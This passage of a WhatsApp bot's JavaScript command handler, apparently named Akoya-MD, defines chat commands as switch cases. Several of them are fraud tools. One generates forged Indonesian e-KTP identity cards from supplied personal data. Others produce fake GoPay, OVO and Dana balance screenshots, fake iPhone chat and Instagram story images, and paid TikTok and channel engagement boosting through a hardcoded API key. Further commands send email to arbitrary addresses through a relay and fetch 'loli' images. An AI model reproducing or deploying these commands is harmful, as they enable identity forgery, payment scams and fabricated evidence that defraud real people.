                  content: []
                }]
              }]
            }]
          });
        }
        break;
      case "rch":
        {
          const rchLink = args[0];
          let rchEmojiRaw = args.slice(1).join(' ').trim();
          if (!rchLink || !rchEmojiRaw) {
            return xreply(`The format is incomplete~ 📋\n\n` + `*${prefix + command} <link_pesan_channel> <emoji1,emoji2>*\n\n` + `example:
` + `*${prefix + command} https://whatsapp.com/channel/xxx/5 😭,🔥*`);
          }
          if (!rchLink.includes('whatsapp.com/channel/')) {
            return xreply("the channel link is not valid~ (｡•́︿•̀｡) it must be a WhatsApp Channel link 🌸");
          }
          const rchLinkClean = rchLink.split('?')[0].replace(/\/+$/, '');
          const rchSlashCount = (rchLinkClean.match(/\//g) || []).length;
          if (rchSlashCount < 5) {
            return xreply("Akoya~ a channel *profile* link, not a channel *message* link~ (｡•́︿•̀｡)\n\n" + "open the message in the channel, then copy its link (the number at the end, e.g. .../141) 🌸");
          }
          if (rchSlashCount !== 5) {
            return xreply("the channel message link is not valid~ (｡•́︿•̀｡) try checking again 🌸");
          }
          if (!rchEmojiRaw.includes(',')) {
            rchEmojiRaw = Array.from(rchEmojiRaw).filter(ch => ch.trim().length > 0).join(',');
          }
          const rchEmojis = rchEmojiRaw.split(',').map(e => e.trim()).filter(Boolean);
          if (!rchEmojis.length) return xreply("Emoji- mana ~ 😅🌸");
          if (rchEmojis.length > 4) return xreply("Maximum 4 emoji aja ~ 🌸");
          await client.sendMessage(m.chat, {
            react: {
              text: '🕒',
              key: m.key
            }
          });
          try {
            const rchApiUrl = `https://api.nexadev.my.id/api/rch?key=GateKey22` + `&url=${encodeURIComponent(rchLink)}` + `&reaction=${encodeURIComponent(rchEmojis.join(','))}`;
            const {
              data: rchResult
            } = await axios.get(rchApiUrl, {
              timeout: 30000
            });
            if (rchResult && rchResult.status === false) {
              throw new Error(rchResult.message || "the RCH API returned a failed status");
            }
            await client.sendMessage(m.chat, {
              react: {
                text: '✅',
                key: m.key
              }
            });
            await xreply(`🔔 *Succeed React Channel*
└╼ *link* : ${rchLink}
└╼ *react* : \`${rchEmojis.join(', ')}\`
└╼ *status* : *Success*`);
          } catch (rchErr) {
            console.error('[rch-error]', rchErr.response?.data || rchErr.message);
            await client.sendMessage(m.chat, {
              react: {
                text: '❌',
                key: m.key
              }
            });
            await xreply(`
‼️ *𝖥𝖺𝗂𝗅𝖾𝖽 𝗍𝗈 𝗋𝖾𝖺𝖼𝗍 𝗍𝗈 𝗍𝗁𝖾 𝖼𝗁𝖺𝗇𝗇𝖾𝗅*
└╼ *𝗅𝗂𝗇𝗄* : ${rchLink}
└╼ *𝗋𝖾𝖺𝖼𝗍* : \`${rchEmojis.join(', ')}\`
└╼ *𝗌𝗍𝖺𝗍𝗎𝗌*: *failed, try again ~*`);
          }
        }
        break;

      /// ───────────── [ 𝖦𝖾𝗍 𝖢𝖺𝗌𝖾 ] ──────────── ///
      case 'getcase':
        {
          try {
            if (!isOwner) return reply(mess.owner);
            if (!text) return xreply("❌ Enter name case!\n\nexample:.getcase menu");
            const caseFilePath = './case.js';
            let caseFileContent = fs.readFileSync(caseFilePath, 'utf8');
            let caseLines = caseFileContent.split('\n');
            let caseRegex = new RegExp(`^\\s*case\\s+['"]${text}['"]\\s*:`);
            let startLine = null;
            let endLine = null;
            let foundCase = null;
            for (let i = 0; i < caseLines.length; i++) {
              if (caseRegex.test(caseLines[i])) {
                startLine = i;
                foundCase = [];
                for (let j = i; j < caseLines.length; j++) {
                  foundCase.push(caseLines[j]);
                  if (/^\s*break\s*/.test(caseLines[j])) {
                    endLine = j;
                    break;
                  }
                }
                break;
              }
            }
            if (!foundCase) return xreply(`❌ Case *${text}* not found!`);
            let caseContent = foundCase.join('\n');
            let teksnya = `💌 \`Case found!\`\n\n*Name Case :* ${text}\n*Baris :* ${startLine + 1} - ${endLine + 1}\n\n> © Akoya-MD`;
            let msgii = generateWAMessageFromContent(m.chat, {
              viewOnceMessage: {
                message: {
                  "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                  },
                  interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                      text: teksnya
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      buttons: [{
                        "name": "cta_copy",
                        "buttonParamsJson": JSON.stringify({
                          "display_text": "Salin Isi Case",
                          "copy_code": caseContent
                        })
                      }]
                    })
                  })
                }
              }
            }, {
              userJid: m.sender,
              quoted: qpayment
            });
            await client.relayMessage(msgii.key.remoteJid, msgii.message, {
              messageId: msgii.key.id
            });
          } catch (error) {
            console.error("error while searching the case:", error);
            xreply("❌ failed to search case.");
          }
        }
        break;

      /// ───────────── [ 𝖥𝖺𝗄𝖾 𝖪𝖳𝖯 ] ──────────── ///
      case 'fakektp':
        {
          try {
            if (!text) {
              return xreply(`*Contoh penggunaan:*\n${prefix + command} provinsi|kota|nik|nama|ttl|jenis_kelamin|golongan_darah|alamat|rt/rw|kelurahan|kecamatan|agama|status|pekerjaan|kewarganegaraan|masa_berlaku|terbuat|photo_url

*Format example:*
${prefix + command} Jakarta|Jakarta Timur|31752331637393|Reyz|24-04-2008 Jakarta|laki-laki|AB|jalan bahagia|08/06|Tengah|Kramat jati|Islam|belum menikah|manajer|Indonesia|seumur hidup|21-12-2026|https://cdn.yupra.my.id/yp/vi1275ok.png`);
            }
            await client.sendMessage(m.chat, {
              react: {
                text: '⏳',
                key: m.key
              }
            });
            const params = text.split('|');
            if (params.length < 18) {
              return xreply(`*⚠️ Missing parameters!*

Required *18 parameters*, but only received *${params.length}*.
*Make sure urutan parameter matching example!*`);
            }
            const baseURL = 'https://theresapisv3.vercel.app/canvas/ektp';
            const query = new URLSearchParams({
              provinsi: params[0].trim(),
              kota: params[1].trim(),
              nik: params[2].trim(),
              nama: params[3].trim(),
              ttl: params[4].trim(),
              jenis_kelamin: params[5].trim(),
              golongan_darah: params[6].trim(),
              alamat: params[7].trim(),
              'rt/rw': params[8].trim(),
              'kel/desa': params[9].trim(),
              kecamatan: params[10].trim(),
              agama: params[11].trim(),
              status: params[12].trim(),
              pekerjaan: params[13].trim(),
              kewarganegaraan: params[14].trim(),
              masa_berlaku: params[15].trim(),
              terbuat: params[16].trim(),
              pas_photo: params[17].trim()
            });
            const url = `${baseURL}?${query.toString()}`;
            const response = await fetch(url);
            if (!response.ok) {
              Reply(`*🍂 failed to fetch image!*
*Status server:* ${response.status} ${response.statusText}`);
            }
            const buffer = await response.arrayBuffer();
            await client.sendMessage(m.chat, {
              image: Buffer.from(buffer)
            }, {
              quoted: m
            });
          } catch (error) {
            xreply(`*🍂 an error occurred!*

*message error:* ${error.message}
*Tips:* double-check the photo URL or your internet connection.`);
          } finally {
            await client.sendMessage(m.chat, {
              react: {
                text: '',
                key: m.key
              }
            });
          }
        }
        ;
        break;

      /// ───────────── [ 𝖢𝗁𝖾𝖼𝗄 𝖻𝖺𝗅𝖺𝗇𝖼𝖾 & 𝗌𝖾𝗇𝖽 𝖺 𝖳𝖳 𝗆𝖾𝗌𝗌𝖺𝗀𝖾 ] ──────────── ///
      case 'ceksaldo':
        {
          try {
            const axios = require('axios');
            await xreply("⏳ checking the balance...");
            const {
              data
            } = await axios.post(`https://fayupedia.id/api/services`, new URLSearchParams({
              api_id: global.idapi,
              api_key: global.apitiktok
            }), {
              headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'application/json',
                'User-Agent': 'Mozilla/5.0'
              }
            });
            if (!data) {
              return xreply("❌ no response from the server");
            }
            if (data.status !== true) {
              return xreply(`❌ ${data.msg || "failed to check the balance"}`);
            }
            Reply(`
💰 *CHECK balance*

📊 Balance: Rp${data.balance}
📌 Status: ${data.msg}
`);
          } catch (e) {
            console.log(e);
            xreply(`❌ Error\n\n${e.response?.data?.msg || e.message}`);
          }
        }
        break;
      case 'pesantt':
        {
          try {
            const axios = require('axios');
            if (!text) {
              return xreply(`📦 *PESANTT ORDER*

how to use:
.pesantt <service>|<target>|<quantity>

example:
.pesantt 9|sebastianwirajaya11|100`);
            }
            const parts = text.split('|');
            if (parts.length < 3) {
              return xreply(`❌ wrong format

example:
.pesantt 9|username|100`);
            }
            const service = parts[0].trim();
            const target = parts[1].trim();
            const quantity = parseInt(parts[2]);
            if (isNaN(service) || isNaN(quantity)) {
              return xreply(`❌ Service and quantity must angka`);
            }
            if (!target) {
              return xreply(`❌ the target must not be empty`);
            }
            await xreply("⏳ sending the order...");
            const {
              data
            } = await axios.post(`https://fayupedia.id/api/order`, new URLSearchParams({
              api_id: global.idapi,
              api_key: global.apitiktok,
              service: service,
              target: target,
              quantity: quantity
            }), {
              headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'application/json',
                'User-Agent': 'Mozilla/5.0'
              }
            });
            if (!data) {
              return xreply("❌ no response from the server");
            }
            if (data.status !== true) {
              return xreply(`❌ ${data.msg || "failed to create pesanan"}`);
            }
            Reply(`
✅ *ORDER placed*

📦 Order ID: #${data.order}
📌 Status: Processing
🎯 Target: ${target}
📊 Quantity: ${quantity}
🧾 Service ID: ${service}
`);
          } catch (e) {
            console.log(e);
            xreply(`❌ Error\n\n${e.response?.data?.msg || e.message}`);
          }
        }
        break;
      case 'ordertt':
        {
          try {
            const axios = require('axios');
            await xreply("⏳ fetching the TikTok service...");
            const {
              data
            } = await axios.post('https://fayupedia.id/api/services', new URLSearchParams({
              api_id: global.idapi,
              api_key: global.apitiktok
            }), {
              headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'application/json',
                'User-Agent': 'Mozilla/5.0'
              }
            });
            if (!data?.status) {
              return xreply(`❌ ${data?.msg || "failed to fetch data layanan"}`);
            }
            const ids = [1734, 1334, 1335, 1336, 1337, 1338];
            const services = [];
            for (const id of ids) {
              const svc = data.services.find(v => Number(v.id) === id);
              if (svc) services.push(svc);
            }
            if (!services.length) {
              return xreply("❌ Layanan TikTok not found");
            }
            let menu = `📦 *TIKTOK BOOST LIST*

please copy ID service using tombol dibawah.

example order:

.pesantt

─────────────────

`;
            services.forEach((s, i) => {
              menu += `${i + 1}. ${s.name}

🆔 ID : ${s.id}
💰 price: Rp${Number(s.price).toLocaleString('en-GB')}
📉 Min : ${s.min}
📈 Max : ${s.max}
🔁 Refill : ${s.refill ? 'Yes' : 'No'}

`;
            });
            const thum = await fs.promises.readFile('./media/thum.jpg');
            const thums = await prepareWAMessageMedia({
              image: thum
            }, {
              upload: client.waUploadToServer
            });
            const interactive = {
              header: {
                hasMediaAttachment: true,
                imageMessage: thums.imageMessage
              },
              body: {
                text: menu
              },
              footer: {
                text: "TikTok Suntik Service"
              },
              nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                  limited_time_offer: {
                    text: "TikTok Service",
                    url: "https://wa.me/233533416608",
                    copy_code: "TikTok",
                    expiration_time: Date.now() * 999
                  },
                  bottom_sheet: {
                    in_thread_buttons_limit: 2,
                    divider_indices: [1, 2, 3, 4, 5, 6, 7, 999],
                    list_title: "TikTok Service",
                    button_title: "📋 choose Copy Code Tiktok"
                  },
                  tap_target_configuration: {
                    title: "▸ X ◂",
                    description: "TikTok Service",
                    canonical_url: "https://wa.me/233533416608",
                    domain: "shop.example.com",
                    button_index: 0
                  }
                }),
                buttons: [{
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    has_multiple_buttons: true
                  })
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    has_multiple_buttons: true
                  })
                }, {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "🛒 ORDER TIKTOK",
                    id: ".pesantt"
                  })
                }, {
                  name: "cta_copy",
                  buttonParamsJson: JSON.stringify({
                    display_text: "📦 ID 1734",
                    id: "-",
                    copy_code: "1734"
                  })
                }, {
                  name: "cta_copy",
                  buttonParamsJson: JSON.stringify({
                    display_text: "📦 ID 1334",
                    id: "-",
                    copy_code: "1334"
                  })
                }, {
                  name: "cta_copy",
                  buttonParamsJson: JSON.stringify({
                    display_text: "📦 ID 1335",
                    id: "-",
                    copy_code: "1335"
                  })
                }, {
                  name: "cta_copy",
                  buttonParamsJson: JSON.stringify({
                    display_text: "📦 ID 1336",
                    id: "-",
                    copy_code: "1336"
                  })
                }, {
                  name: "cta_copy",
                  buttonParamsJson: JSON.stringify({
                    display_text: "📦 ID 1337",
                    id: "-",
                    copy_code: "1337"
                  })
                }, {
                  name: "cta_copy",
                  buttonParamsJson: JSON.stringify({
                    display_text: "📦 ID 1338",
                    id: "-",
                    copy_code: "1338"
                  })
                }]
              }
            };
            await client.sendMessage(m.chat, {
              viewOnceMessageV2Extension: {
                message: {
                  messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                  },
                  interactiveMessage: proto.Message.InteractiveMessage.fromObject(interactive)
                }
              }
            }, {
              quoted: m
            });
          } catch (e) {
            console.log(e);
            xreply(`❌ Error

${e.response?.data?.msg || e.message}`);
          }
        }
        break;

      /// ───────────── [ 𝖳𝗈𝗎𝗋𝗅 & 𝖴𝗉𝗅𝗈𝖺𝖽𝖾𝗋 ] ──────────── ///
      case "ttqc":
        {
          if (!m.quoted) return xreply("❌ Reply to a photo first!");
          if (!text || !text.includes("|")) return xreply("❌ Format: .ttqc name|text");
          let [name, pesan] = text.split("|");
          name = name.trim();
          pesan = pesan.trim();
          if (!name || !pesan) return xreply("❌ name and text must not be empty!");
          if (!/image/.test(mime)) return xreply("❌ Reply photo!");
          await xreply("⏳ one moment...");
          try {
            let media = await client.downloadAndSaveMediaMessage(qmsg);
            if (!media) return xreply("❌ failed downloading photo!");
            const {
              ImageUploadService
            } = require("node-upload-images");
            const service = new ImageUploadService("pixhost.to");
            let {
              directLink
            } = await service.uploadFromBinary(fs.readFileSync(media), "rafaofficial.png");
            let imageUrl = directLink.toString();
            let apiUrl = `https://apii.nexadev.my.id/ttqc` + `?url=${encodeURIComponent(imageUrl)}` + `&name=${encodeURIComponent(name)}` + `&text=${encodeURIComponent(pesan)}`;
            let hasil = await fetch(apiUrl);
            if (!hasil.ok) throw new Error("API Error: " + hasil.status);
            let buffer = Buffer.from(await hasil.arrayBuffer());
            await client.sendMessage(m.chat, {
              image: buffer,
              caption: "✨ TTQC success created!"
            }, {
              quoted: m
            });
            if (fs.existsSync(media)) await fs.unlinkSync(media);
          } catch (e) {
            console.error(e);
            xreply(`❌ failed to create TTQC!
${e.message}`);
          }
        }
        break;
      case 'iqc':
        {
          if (!text) return reply("use:.iqc hour|battery|message\nexample:.iqc 18:00|40|hai hai");
          let [time, battery, ...msg] = text.split('|');
          if (!time || !battery || msg.length === 0) throw "wrong format, use:\n.iqc hour|battery|message\nexample:\n.iqc 18:00|40|hai hai";
          await Reply("hold on a moment.");
          let messageText = encodeURIComponent(msg.join('|').trim());
          let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&batteryPercentage=${battery}&carrierName=INDOSAT%20OREDOO&messageText=${messageText}&emojiStyle=apple`;
          let res = await fetch(url);
          if (!res.ok) throw "failed fetch url";
          let buffer = await res.buffer();
          await client.sendMessage(m.chat, {
            image: buffer
          }, {
            quoted: m
          });
        }
        break;
      case 'iqcv2':
        {
          try {
            if (!m.quoted) {
              return xreply(`*reply to a photo then type:*

.iqcv2 text|carrier|battery|signal|sender|read

*example:*
.iqcv2 Halo just a little|XL|100|4|other|false

*Sender:*
• self
• other

*Read:*
• true
• false`);
            }
            let mime = (m.quoted.msg || m.quoted).mimetype || "";
            if (!/image/.test(mime)) {
              return xreply("❌ Reply to a photo first!");
            }
            if (!text) {
              return xreply(`*Format:*

.iqcv2 text|carrier|battery|signal|sender|read`);
            }
            let args = text.split("|");
            if (args.length < 6) {
              return xreply(`wrong format!

.iqcv2 text|carrier|battery|signal|sender|read`);
            }
            let [pesan, carrier, battery, signal, sender, read] = args;
            battery = Number(battery);
            signal = Number(signal);
            if (isNaN(battery) || battery < 1 || battery > 100) return xreply("Battery must 1-100");
            if (isNaN(signal) || signal < 1 || signal > 4) return xreply("Signal must 1-4");
            sender = sender.toLowerCase();
            read = read.toLowerCase();
            if (!["self", "other"].includes(sender)) return xreply("Sender must be self / other");
            if (!["true", "false"].includes(read)) return xreply("Read must be true / false");
            Reply("⏳ Uploading photo to Pixhost...");
            const buffer = await m.quoted.download();
            const imageUrl = await uploadPixhost(buffer, "iqcv2.jpg");
            Reply("⏳ Membuat IQC V2...");
            const api = `https://api-nanzz.my.id/docs/api/maker/iqc-gambar.php?text=${encodeURIComponent(pesan)}&url=${encodeURIComponent(imageUrl)}&carrier=${encodeURIComponent(carrier)}&battery=${battery}&signal=${signal}&sender=${sender}&read=${read}`;
            await client.sendMessage(m.chat, {
              image: {
                url: api
              },
              caption: `乂 *IQC V2 SUCCESS*

💬 Text : ${pesan}
📡 Carrier : ${carrier}
🔋 Battery : ${battery}%
📶 Signal : ${signal}
👤 Sender : ${sender}
✅ Read : ${read}`
            }, {
              quoted: m
            });
          } catch (e) {
            console.log(e);
            xreply(`❌ ${e.message}`);
          }
        }
        break;
      case 'igv2':
        {
          try {
            let q = m.quoted ? m.quoted : m;
            let media = await q.download();
            const axios = require('axios');
            const FormData = require('form-data');
            let form = new FormData();
            form.append('name', 'Akoya-MD');
            form.append('text', 'Halo Dunia');
            form.append('file', media, 'image.jpg');
            console.log('FIELDS:');
            console.log(form);
            let res = await axios.post('https://api-nanzz.my.id/docs/api/maker/fake-story-ig2.php', form, {
              headers: form.getHeaders()
            });
            console.log(res.data);
            xreply(JSON.stringify(res.data));
          } catch (e) {
            console.log(e.response?.data || e);
            xreply(JSON.stringify(e.response?.data || e.message));
          }
        }
        break;

      /// ───────────── [ 𝖥𝖺𝗄𝖾 𝖦𝖺𝗆𝖻𝖺𝗋 𝖫𝖺𝗂𝗇 ] ──────────── ///
      case 'fakestory':
        {
          try {
            const {
              createCanvas,
              loadImage
            } = require('canvas');
            await client.sendMessage(m.chat, {
              react: {
                text: '⏳',
                key: m.key
              }
            });
            let [username, caption] = text.split('|');
            if (!username || !caption) return xreply(`Kek gini:\n.${command} Ichika|hmm...`);
            const bgUrl = 'https://files.catbox.moe/3gwr1l.jpg';
            const bg = await loadImage(bgUrl);
            const userPP = await client.profilePictureUrl(m.sender, 'image').catch(_ => 'https://img1.pixhost.to/images/5831/600387261_biyu-offc.jpg');
            const pp = await loadImage(userPP);
            const canvas = createCanvas(720, 1280);
            const ctx = canvas.getContext('2d');
            ctx.drawImage(bg, 0, 0, canvas.width, canvas.height);
            const ppX = 40;
            const ppY = 250;
            const ppSize = 70;
            ctx.save();
            ctx.beginPath();
            ctx.arc(ppX + ppSize / 2, ppY + ppSize / 2, ppSize / 2, 0, Math.PI * 2);
            ctx.closePath();
            ctx.clip();
            ctx.drawImage(pp, ppX, ppY, ppSize, ppSize);
            ctx.restore();
            ctx.font = '28px Arial';
            ctx.fillStyle = '#FFFFFF';
            ctx.textAlign = 'left';
            ctx.textBaseline = 'middle';
            const usernameX = ppX + ppSize + 15;
            const usernameY = ppY + ppSize / 2;
            ctx.fillText(username, usernameX, usernameY);
            ctx.font = 'bold 30px Arial';
            ctx.fillStyle = '#FFFFFF';
            ctx.textAlign = 'center';
            ctx.textBaseline = 'top';
            const captionX = canvas.width / 2;
            const captionY = canvas.height - 650;
            const maxWidth = canvas.width - 100;
            const lineHeight = 42;
            wrapTextCenter(ctx, caption, captionX, captionY, maxWidth, lineHeight);
            let buffer = canvas.toBuffer();
            await client.sendMessage(m.chat, {
              image: buffer,
              caption: "success"
            }, {
              quoted: m
            });
          } catch (e) {
            xreply(`❌ Error\nLogs error : ${e.message}`);
          }
          function wrapTextCenter(ctx, text, x, y, maxWidth, lineHeight) {
            let line = '';
            for (let i = 0; i < text.length; i++) {
              let testLine = line + text[i];
              let testWidth = ctx.measureText(testLine).width;
              if (testWidth > maxWidth && line !== '') {
                ctx.fillText(line, x, y);
                line = text[i];
                y += lineHeight;
              } else {
                line = testLine;
              }
            }
            if (line) ctx.fillText(line, x, y);
          }
        }
        break;
      case 'fakegopay':
        {
          try {
            if (!text) {
              return xreply(`usage example:

.fakegopay 10000,150,0,Juni

Format:
.fakegopay balance,coins,used,month`);
            }
            let [saldo, koin, terpakai, bulan] = text.split(',');
            if (!saldo || !koin || !terpakai || !bulan) {
              return xreply(`wrong format!

example:
.fakegopay 10000,150,0,Juni`);
            }
            if (isNaN(saldo)) return xreply("the balance must be a number!");
            if (isNaN(koin)) return xreply("Coins must in the form of angka!");
            if (isNaN(terpakai)) return xreply("Used must in the form of angka!");
            let api = `https://api.synoxcloud.xyz/canvas/fake-gopay?saldo=${encodeURIComponent(saldo)}&koin=${encodeURIComponent(koin)}&terpakai=${encodeURIComponent(terpakai)}&bulan=${encodeURIComponent(bulan)}`;
            await client.sendMessage(m.chat, {
              image: {
                url: api
              },
              caption: `乂 *FAKE GOPAY*

💰 balance: Rp${Number(saldo).toLocaleString('en-GB')}
🪙 Coins : ${Number(koin).toLocaleString('en-GB')}
📉 Used : ${Number(terpakai).toLocaleString('en-GB')}
📅 Month : ${bulan}`
            }, {
              quoted: m
            });
          } catch (e) {
            console.error(e);
            xreply("failed to create Fake GoPay");
          }
        }
        break;
      case 'fakeovo':
        {
          try {
            if (!text) {
              return xreply(`usage example:

.fakeovo 50000000`);
            }
            if (isNaN(text)) {
              return xreply("the amount must be a number!");
            }
            let nominal = text.trim();
            let api = `https://api-nanzz.my.id/docs/api/maker/fake-ovo.php?text=${encodeURIComponent(nominal)}&amount=test_value&query=test_value&q=test_value`;
            await client.sendMessage(m.chat, {
              image: {
                url: api
              },
              caption: `乂 *FAKE OVO*

💰 Nominal : Rp${Number(nominal).toLocaleString('en-GB')}`
            }, {
              quoted: m
            });
          } catch (e) {
            console.error(e);
            xreply("failed to create Fake OVO");
          }
        }
        break;
      case 'fakedana':
        {
          try {
            if (!text) {
              return xreply(`usage example:

.fakedana 1500000`);
            }
            if (isNaN(text)) {
              return xreply("the amount must be a number!");
            }
            let nominal = text.trim();
            let api = `https://api-nanzz.my.id/docs/api/maker/fake-dana.php?text=${encodeURIComponent(nominal)}`;
            await client.sendMessage(m.chat, {
              image: {
                url: api
              },
              caption: `乂 *FAKE DANA*

💰 Nominal : Rp${Number(nominal).toLocaleString('en-GB')}`
            }, {
              quoted: m
            });
          } catch (e) {
            console.error(e);
            xreply("failed to create Fake Dana");
          }
        }
        break;

      /// ───────────── [ 𝖡𝗅𝗎𝖾 𝖠𝗋𝖼𝗁𝗂𝗏𝖾 & 𝖫𝗈𝗅𝗂 ] ──────────── ///
      case 'blue':
        {
          try {
            await client.sendMessage(m.chat, {
              react: {
                text: '⏳',
                key: m.key
              }
            });
            const api = 'https://api.synoxcloud.xyz/random/bluearchive';
            await client.sendMessage(m.chat, {
              image: {
                url: api
              },
              caption: "✅ success"
            }, {
              quoted: m
            });
          } catch (e) {
            console.error(e);
            await client.sendMessage(m.chat, {
              react: {
                text: '❌',
                key: m.key
              }
            });
          }
        }
        break;
      case 'loli':
        {
          try {
            await xreply("⏳ fetching a random image...");
            const api = 'https://api.synoxcloud.xyz/random/loli';
            await client.sendMessage(m.chat, {
              image: {
                url: api
              },
              caption: "✅ success fetching a random image"
            }, {
              quoted: m
            });
          } catch (err) {
            console.error(err);
            xreply("❌ failed to fetch image.");
          }
        }
        break;
      case 'waifu':
        {
          try {
            await client.sendMessage(m.chat, {
              react: {
                text: '⏳',
                key: m.key
              }
            });
            const apiUrl = 'https://api.nekolabs.my.id/random/blue-archive';
            const res = await fetch(apiUrl);
            if (!res.ok) throw new Error(`Status ${res.status}`);
            const buffer = await res.arrayBuffer();
            await client.sendMessage(m.chat, {
              image: Buffer.from(buffer),
              caption: '🍁 *Here is your Blue Archive~*'
            }, {
              quoted: m
            });
          } catch (e) {
            console.error(e);
            await xreply(`🍂 *Ups error:* ${e.message || e}`);
          } finally {
            await client.sendMessage(m.chat, {
              react: {
                text: '',
                key: m.key
              }
            });
          }
        }
        break;

      /// ───────────── [ 𝖡𝗂𝗇𝖺𝗋𝗒 𝖢𝗈𝗇𝗏𝖾𝗋𝗍𝖾𝗋 ] ──────────── ///
      case 'binary':
      case 'bin':
        {
          const teks = args.join(' ').trim();
          if (!teks) {
            return client.sendMessage(m.chat, {
              text: `- usage example:
${prefix}binary --text "01001000"\n${prefix}binary --binarycode "Hello"`
            }, {
              quoted: m
            });
          }
          try {
            const bintoteks = teks.startsWith('--teks');
            const tekstobin = teks.startsWith('--binarycode');
            if (!bintoteks && !tekstobin) {
              return client.sendMessage(m.chat, {
                text: `- Tentukan mode konversi:\n--text (binary to text)\n--binarycode (text to binary)`
              }, {
                quoted: m
              });
            }
            const input = teks.split(' ').slice(1).join(' ').trim();
            if (!input) {
              return client.sendMessage(m.chat, {
                text: "Enter text/binary valid"
              }, {
                quoted: m
              });
            }
            let hsil;
            if (bintoteks) {
              const cb = input.replace(/[^01 ]/g, '');
              if (!cb) throw new Error("Binary code invalid");
              const res = await fetch('https://www.magictool.ai/functions/BINARY-TEXT.php', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/x-www-form-urlencoded',
                  'User-Agent': 'Mozilla/5.0'
                },
                body: `input=${encodeURIComponent(cb)}`
              });
              hsil = await res.text();
              if (!res.ok || !hsil || hsil.includes('error')) {
                throw new Error("the API failed to process");
              }
            } else {
              const res = await fetch('https://www.magictool.ai/functions/TEXT-BINARY.php', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/x-www-form-urlencoded',
                  'User-Agent': 'Mozilla/5.0'
                },
                body: `input=${encodeURIComponent(input)}`
              });
              hsil = await res.text();
              if (!res.ok || !hsil || hsil.includes('error')) {
                throw new Error("the API failed to process");
              }
            }
            await client.sendMessage(m.chat, {
              text: hsil
            }, {
              quoted: m
            });
          } catch (error) {
            console.error('Error:', error);
            client.sendMessage(m.chat, {
              text: `failed mengkonversi: ${error.message}`
            }, {
              quoted: m
            });
          }
        }
        break;

      /// ───────────── [ 𝖫𝖾𝗆𝗈𝗇 𝖬𝖺𝗂𝗅 & 𝖳𝖾𝗆𝗉𝖬𝖺𝗂𝗅 ] ──────────── ///
      case 'lemonmail':
        {
          const argsxx = text.split('|');
          if (args.length < 3) return xreply("wrong format! Usage: email|subject|message");
          const [target, subject, message] = argsxx;
          xreply("sending the email...");
          try {
            const data = JSON.stringify({
              "to": target.trim(),
              "subject": subject.trim(),
              "message": message.trim()
            });
            const config = {
              method: 'POST',
              url: 'https://lemon-email.vercel.app/send-email',
              headers: {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
                'Content-Type': 'application/json',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
                'sec-ch-ua-mobile': '?1',
                'origin': 'https://lemon-email.vercel.app',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://lemon-email.vercel.app/',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'priority': 'u=1, i'
              },
              data: data
            };
            const axios = require('axios');
            const api = await axios.request(config);
            xreply(`Result: ${JSON.stringify(api.data, null, 2)}`);
          } catch (error) {
            xreply(`Error: ${error.message}`);
          }
        }
        break;
      case 'tempmail':
        {
          class TempMail {
            constructor() {
              this.cookie = null;
              this.baseUrl = 'https://tempmail.so';
            }
            async updateCookie(response) {
              if (response.headers['set-cookie']) {
                this.cookie = response.headers['set-cookie'].join('; ');
              }
            }
            async makeRequest(url) {
              const axios = require('axios');
              const response = await axios({
                method: 'GET',
                url: url,
                headers: {
                  'accept': 'application/json',
                  'cookie': this.cookie || '',
                  'referer': this.baseUrl + '/',
                  'x-inbox-lifespan': '600',
                  'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
                  'sec-ch-ua-mobile': '?1'
                }
              });
              await this.updateCookie(response);
              return response;
            }
            async initialize() {
              const axios = require('axios');
              const response = await axios.get(this.baseUrl, {
                headers: {
                  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
                  'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"'
                }
              });
              await this.updateCookie(response);
              return this;
            }
            async getInbox() {
              const url = `${this.baseUrl}/us/api/inbox?requestTime=${Date.now()}&lang=us`;
              const response = await this.makeRequest(url);
              return response.data;
            }
            async getMessage(messageId) {
              const url = `${this.baseUrl}/us/api/inbox/messagehtmlbody/${messageId}?requestTime=${Date.now()}&lang=us`;
              const response = await this.makeRequest(url);
              return response.data;
            }
          }
          try {
            const mail = new TempMail();
            await mail.initialize();
            const inbox = await mail.getInbox();
            if (!inbox.data?.name) {
              throw new Error('Failed to get temporary email');
            }
            const emailInfo = `Temporary Email\n\n*Email :* ${inbox.data.name}\n *Expired :* 10 minutes\nInbox Status : ${inbox.data.inbox?.length || 0} message

> The email is deleted automatically after 10 minutes`;
            await xreply(emailInfo);
            const state = {
              processedMessages: new Set(),
              lastCheck: Date.now(),
              isRunning: true
            };
            const processInbox = async () => {
              if (!state.isRunning) return;
              try {
                const updatedInbox = await mail.getInbox();
                if (updatedInbox.data?.inbox?.length > 0) {
                  const sortedMessages = [...updatedInbox.data.inbox].sort((a, b) => new Date(b.date) - new Date(a.date));
                  for (const message of sortedMessages) {
                    if (!state.processedMessages.has(message.id)) {
                      const messageDetail = await mail.getMessage(message.id);
                      let cleanContent = messageDetail.data?.html ? messageDetail.data.html.replace(/<[^>]*>?/gm, '').trim() : 'No text content';
                      const messageInfo = `_You have a new message_

